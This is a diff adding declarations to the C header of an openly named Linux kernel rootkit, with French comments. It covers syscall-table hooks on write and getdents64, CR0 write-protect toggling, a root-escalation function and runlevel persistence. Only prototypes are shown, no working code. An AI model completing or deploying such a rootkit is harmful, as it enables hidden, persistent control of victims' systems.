@@ -5,7 +5,29 @@
 #include <linux/kprobes.h>
 #include <linux/cred.h>
 #include <linux/sched.h>
+
+#include <linux/module.h>
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/namei.h>
+
+// all libs
+#include <linux/dirent.h>
+#include <linux/slab.h>
+#include <linux/version.h> 
+#include <asm/uaccess.h>
+#include <linux/proc_ns.h>
+#include <linux/proc_fs.h>
+#include <linux/file.h>
+#include <linux/fdtable.h>
+#include <linux/unistd.h>
+#include <linux/fs.h>
+
 #include <linux/ptrace.h>
+
 
 // Features exécutées par les hooks
 int become_root(void);
@@ -37,6 +59,22 @@ int ret_signal(struct kretprobe_instance *ri, struct pt_regs *regs);
 
 // Fonctions d'aide
 void print_registers(struct pt_regs *regs);
+
+// Hook sur syscall write
+asmlinkage int hook_write(struct pt_regs *regs);
+int __init rootkit_init_hook(void);
+void __exit rootkit_exit_hook(void);
+inline void protect_memory(void);
+inline void unprotect_memory(void);
+inline void cr0_write(unsigned long cr0);
+extern unsigned long * __sys_call_table;
+// Hook sur syscall getdents64
+asmlinkage int hook_getdents64(struct pt_regs *regs);
+int __init rootkit_init_hook_getdents64(void);
+void __exit rootkit_exit_hook_getdents64(void);
+
+// Persistence en ajoutant un script dans runlevels
+void persistence_runlevels(void);
 
 #endif 
 
